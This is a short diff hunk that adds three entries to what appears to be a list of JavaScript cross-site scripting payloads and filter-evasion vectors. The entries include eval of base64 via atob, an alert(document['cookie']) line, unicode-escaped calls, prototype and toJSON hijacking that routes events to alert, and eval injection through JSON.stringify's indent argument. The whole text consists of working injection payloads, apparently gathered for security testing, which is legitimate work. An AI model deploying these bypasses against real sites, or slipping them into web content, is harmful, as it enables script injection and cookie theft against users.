@@ -308,3 +308,6 @@ eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));
 'alert(1)'.replace(/.+/,eval)
 alert(document['cookie'])
 for([]o\u{66}!\u{61}\u{6c}\u{65}\u{72}\u{74}`1`)\u{66}
+Event.prototype.toString=[].join;Event.prototype.length=1;Event.prototype[0]=1;onhashchange=alert;onmessage=alert;
+toJSON=alert;JSON.stringify(window);
+eval(JSON.stringify({a:1},null,'alert(1)//'))
